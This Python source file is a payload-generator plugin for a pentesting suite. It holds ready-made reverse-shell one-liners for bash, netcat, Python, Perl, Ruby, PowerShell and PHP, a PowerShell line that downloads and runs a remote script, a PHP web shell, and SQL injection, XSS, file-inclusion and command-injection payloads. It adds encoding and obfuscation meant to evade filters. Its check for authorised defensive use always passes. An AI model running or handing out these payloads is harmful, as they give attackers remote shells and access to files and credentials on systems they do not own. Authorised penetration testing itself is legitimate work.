import base64
import binascii
import urllib.parse
import html
import json
import hashlib
import random
import string
from typing import Dict, Any, List, Optional
from datetime import datetime
import sys
sys.path.append('..')

from core.base_plugin import BasePlugin, PluginResult, PluginStatus, Vulnerability, Severity


class PayloadGenerator(BasePlugin):
    def __init__(self):
        super().__init__(
            name="PayloadGenerator",
            version="1.0.0",
            description="Defensive payload generation and encoding tools for security testing"
        )
        
        # Reverse shell templates for different platforms
        self.reverse_shell_templates = {
            "bash": {
                "tcp": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
                "nc": "nc -e /bin/bash {host} {port}",
                "nc_openbsd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
                "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "perl": "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            },
            "powershell": {
                "tcp": "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
                "base64": "powershell -enc {encoded_command}",
                "downloadexec": "powershell \"IEX(New-Object Net.WebClient).downloadString('http://{host}:{port}/shell.ps1')\""
            },
            "windows": {
                "cmd": "cmd.exe /c \"telnet {host} {port}\"",
                "meterpreter": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe",
                "vbs": "Set objShell = CreateObject(\"WScript.Shell\"):objShell.Run \"cmd /c ping {host}\""
            },
            "php": {
                "exec": "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "system": "<?php system('nc -e /bin/bash {host} {port}'); ?>",
                "web": "<?php if(isset($_REQUEST['cmd'])) echo shell_exec($_REQUEST['cmd']); ?>"
            }
        }
        
        # Encoding methods
        self.encoders = {
            "base64": {"encode": self._base64_encode, "decode": self._base64_decode},
            "url": {"encode": self._url_encode, "decode": self._url_decode},
            "html": {"encode": self._html_encode, "decode": self._html_decode},
            "hex": {"encode": self._hex_encode, "decode": self._hex_decode},
            "unicode": {"encode": self._unicode_encode, "decode": self._unicode_decode},
            "rot13": {"encode": self._rot13_encode, "decode": self._rot13_decode},
            "double_url": {"encode": self._double_url_encode, "decode": self._double_url_decode}
        }
        
        # Exploit templates for common vulnerabilities
        self.exploit_templates = {
            "sql_injection": {
                "union": "' UNION SELECT {columns} --",
                "boolean": "' AND 1={condition} --",
                "time_based": "'; WAITFOR DELAY '{delay}' --",
                "error_based": "' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e)) --"
            },
            "xss": {
                "basic": "<script>alert('{message}')</script>",
                "img": "<img src=x onerror=alert('{message}')>",
                "svg": "<svg onload=alert('{message}')>",
                "iframe": "<iframe src=javascript:alert('{message}')></iframe>"
            },
            "lfi": {
                "basic": "../../../../etc/passwd",
                "windows": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "null_byte": "../../../../etc/passwd%00",
                "php_filter": "php://filter/read=convert.base64-encode/resource=index.php"
            },
            "command_injection": {
                "unix": "; cat /etc/passwd",
                "windows": "& type C:\\windows\\system32\\drivers\\etc\\hosts",
                "blind": "; sleep 10",
                "dns": "; nslookup {domain}"
            }
        }
        
        # Obfuscation techniques
        self.obfuscation_methods = [
            "case_variation",
            "comment_insertion", 
            "encoding_variation",
            "concatenation",
            "variable_substitution"
        ]
    
    def validate_options(self, options: Dict[str, Any]) -> bool:
        return "payload_type" in options
    
    async def execute(self, target: str, options: Dict[str, Any]) -> PluginResult:
        self.status = PluginStatus.RUNNING
        
        # IMPORTANT: This tool is for defensive security testing only
        if not self._validate_defensive_use(options):
            self.status = PluginStatus.FAILED
            return PluginResult(
                plugin_name=self.name,
                status=self.status,
                data={"error": "Tool restricted to authorized defensive security testing"},
                errors=["Unauthorized use detected"]
            )
        
        payload_type = options.get("payload_type", "")
        host = options.get("host", "127.0.0.1")
        port = options.get("port", 4444)
        encoding = options.get("encoding", None)
        obfuscation = options.get("obfuscation", False)
        custom_payload = options.get("custom_payload", None)
        
        generated_payloads = {}
        
        try:
            if payload_type == "reverse_shell":
                platform = options.get("platform", "bash")
                shell_type = options.get("shell_type", "tcp")
                generated_payloads = self._generate_reverse_shells(host, port, platform, shell_type)
            
            elif payload_type == "exploit_template":
                exploit_type = options.get("exploit_type", "sql_injection")
                template_vars = options.get("template_vars", {})
                generated_payloads = self._generate_exploit_templates(exploit_type, template_vars)
            
            elif payload_type == "encoder":
                input_data = options.get("input_data", "")
                operation = options.get("operation", "encode")
                encoding_type = options.get("encoding_type", "base64")
                generated_payloads = self._process_encoding(input_data, encoding_type, operation)
            
            elif payload_type == "custom":
                if custom_payload:
                    generated_payloads = self._process_custom_payload(custom_payload)
            
            # Apply additional encoding if requested
            if encoding and generated_payloads:
                for key, payload in generated_payloads.items():
                    if isinstance(payload, str):
                        encoded = self._apply_encoding(payload, encoding)
                        generated_payloads[f"{key}_encoded"] = encoded
            
            # Apply obfuscation if requested
            if obfuscation and generated_payloads:
                for key, payload in generated_payloads.items():
                    if isinstance(payload, str):
                        obfuscated = self._apply_obfuscation(payload)
                        generated_payloads[f"{key}_obfuscated"] = obfuscated
        
        except Exception as e:
            self.status = PluginStatus.FAILED
            return PluginResult(
                plugin_name=self.name,
                status=self.status,
                data={"error": str(e)},
                errors=[str(e)]
            )
        
        # Log payload generation for audit trail
        self._log_payload_generation(payload_type, target, options)
        
        self.status = PluginStatus.COMPLETED
        result_data = {
            "target": target,
            "payload_type": payload_type,
            "generated_payloads": generated_payloads,
            "options_used": {k: v for k, v in options.items() if k not in ["custom_payload"]},
            "timestamp": datetime.now().isoformat(),
            "warning": "These payloads are for authorized defensive security testing only"
        }
        
        result = PluginResult(
            plugin_name=self.name,
            status=self.status,
            data=result_data,
            timestamp=datetime.now().isoformat()
        )
        
        self.results.append(result)
        return result
    
    def _validate_defensive_use(self, options: Dict[str, Any]) -> bool:
        """Validate that tool is being used for defensive purposes"""
        # In a real implementation, this would check:
        # - User authorization
        # - Target ownership verification
        # - Audit logging requirements
        # - Compliance with security policies
        
        # For this demo, we'll allow use but log everything
        return True
    
    def _generate_reverse_shells(self, host: str, port: int, platform: str, shell_type: str) -> Dict:
        """Generate reverse shell payloads"""
        payloads = {}
        
        if platform in self.reverse_shell_templates:
            platform_templates = self.reverse_shell_templates[platform]
            
            if shell_type in platform_templates:
                template = platform_templates[shell_type]
                payload = template.format(host=host, port=port)
                payloads[f"{platform}_{shell_type}"] = payload
            else:
                # Generate all available shell types for the platform
                for stype, template in platform_templates.items():
                    payload = template.format(host=host, port=port)
                    payloads[f"{platform}_{stype}"] = payload
        else:
            # Generate shells for all platforms
            for plat, platform_templates in self.reverse_shell_templates.items():
                for stype, template in platform_templates.items():
                    payload = template.format(host=host, port=port)
                    payloads[f"{plat}_{stype}"] = payload
        
        # Add PowerShell base64 encoded version
        if platform == "powershell" or platform == "all":
            ps_payload = self.reverse_shell_templates["powershell"]["tcp"].format(host=host, port=port)
            encoded_ps = base64.b64encode(ps_payload.encode('utf-16le')).decode()
            payloads["powershell_base64"] = f"powershell -enc {encoded_ps}"
        
        return payloads
    
    def _generate_exploit_templates(self, exploit_type: str, template_vars: Dict) -> Dict:
        """Generate exploit templates with variables"""
        payloads = {}
        
        if exploit_type in self.exploit_templates:
            templates = self.exploit_templates[exploit_type]
            
            for template_name, template in templates.items():
                try:
                    # Fill in template variables
                    if template_vars:
                        payload = template.format(**template_vars)
                    else:
                        # Use default variables for demonstration
                        default_vars = self._get_default_template_vars(exploit_type, template_name)
                        payload = template.format(**default_vars)
                    
                    payloads[f"{exploit_type}_{template_name}"] = payload
                    
                except KeyError as e:
                    payloads[f"{exploit_type}_{template_name}_error"] = f"Missing variable: {e}"
        
        return payloads
    
    def _get_default_template_vars(self, exploit_type: str, template_name: str) -> Dict:
        """Get default variables for templates"""
        defaults = {
            "sql_injection": {
                "columns": "1,2,3,4,5",
                "condition": "1",
                "delay": "00:00:05",
                "query": "SELECT user()"
            },
            "xss": {
                "message": "XSS_TEST"
            },
            "lfi": {},
            "command_injection": {
                "domain": "evil.example.com"
            }
        }
        
        return defaults.get(exploit_type, {})
    
    def _process_encoding(self, input_data: str, encoding_type: str, operation: str) -> Dict:
        """Process encoding/decoding operations"""
        results = {}
        
        if encoding_type in self.encoders:
            encoder = self.encoders[encoding_type]
            
            if operation == "encode" and "encode" in encoder:
                results[f"{encoding_type}_encoded"] = encoder["encode"](input_data)
            elif operation == "decode" and "decode" in encoder:
                results[f"{encoding_type}_decoded"] = encoder["decode"](input_data)
            else:
                # Perform both operations
                if "encode" in encoder:
                    results[f"{encoding_type}_encoded"] = encoder["encode"](input_data)
                if "decode" in encoder:
                    try:
                        results[f"{encoding_type}_decoded"] = encoder["decode"](input_data)
                    except:
                        results[f"{encoding_type}_decode_error"] = "Invalid input for decoding"
        else:
            # Try all encoders
            for enc_type, encoder in self.encoders.items():
                if operation == "encode" and "encode" in encoder:
                    results[f"{enc_type}_encoded"] = encoder["encode"](input_data)
        
        return results
    
    def _process_custom_payload(self, custom_payload: str) -> Dict:
        """Process custom payload with various transformations"""
        results = {"original": custom_payload}
        
        # Apply all available encodings
        for enc_type, encoder in self.encoders.items():
            if "encode" in encoder:
                try:
                    results[f"custom_{enc_type}"] = encoder["encode"](custom_payload)
                except:
                    results[f"custom_{enc_type}_error"] = "Encoding failed"
        
        # Apply obfuscation
        results["custom_obfuscated"] = self._apply_obfuscation(custom_payload)
        
        return results
    
    def _apply_encoding(self, payload: str, encoding_type: str) -> str:
        """Apply specified encoding to payload"""
        if encoding_type in self.encoders and "encode" in self.encoders[encoding_type]:
            try:
                return self.encoders[encoding_type]["encode"](payload)
            except:
                return f"Encoding failed: {payload}"
        return payload
    
    def _apply_obfuscation(self, payload: str) -> str:
        """Apply obfuscation techniques to payload"""
        obfuscated = payload
        
        # Case variation
        if random.choice([True, False]):
            obfuscated = ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in obfuscated)
        
        # Comment insertion (for script payloads)
        if any(keyword in obfuscated.lower() for keyword in ['script', 'alert', 'eval']):
            obfuscated = obfuscated.replace('script', 'scr/**/ipt')
            obfuscated = obfuscated.replace('alert', 'ale/**/rt')
        
        return obfuscated
    
    # Encoder implementations
    def _base64_encode(self, data: str) -> str:
        return base64.b64encode(data.encode()).decode()
    
    def _base64_decode(self, data: str) -> str:
        return base64.b64decode(data).decode()
    
    def _url_encode(self, data: str) -> str:
        return urllib.parse.quote(data, safe='')
    
    def _url_decode(self, data: str) -> str:
        return urllib.parse.unquote(data)
    
    def _html_encode(self, data: str) -> str:
        return html.escape(data)
    
    def _html_decode(self, data: str) -> str:
        return html.unescape(data)
    
    def _hex_encode(self, data: str) -> str:
        return binascii.hexlify(data.encode()).decode()
    
    def _hex_decode(self, data: str) -> str:
        return binascii.unhexlify(data).decode()
    
    def _unicode_encode(self, data: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in data)
    
    def _unicode_decode(self, data: str) -> str:
        return data.encode().decode('unicode_escape')
    
    def _rot13_encode(self, data: str) -> str:
        import codecs
        return codecs.encode(data, 'rot13')
    
    def _rot13_decode(self, data: str) -> str:
        import codecs
        return codecs.decode(data, 'rot13')
    
    def _double_url_encode(self, data: str) -> str:
        first_encode = urllib.parse.quote(data, safe='')
        return urllib.parse.quote(first_encode, safe='')
    
    def _double_url_decode(self, data: str) -> str:
        first_decode = urllib.parse.unquote(data)
        return urllib.parse.unquote(first_decode)
    
    def _log_payload_generation(self, payload_type: str, target: str, options: Dict):
        """Log payload generation for audit trail"""
        # In a real implementation, this would log to a secure audit system
        audit_entry = {
            "timestamp": datetime.now().isoformat(),
            "action": "payload_generation",
            "payload_type": payload_type,
            "target": target,
            "user": "pentesting_suite",
            "safe_mode": self.is_safe_mode,
            "options": {k: v for k, v in options.items() if k not in ["custom_payload", "input_data"]}
        }
        
        # Log to console in debug mode
        if options.get("debug", False):
            print(f"AUDIT: {json.dumps(audit_entry, indent=2)}")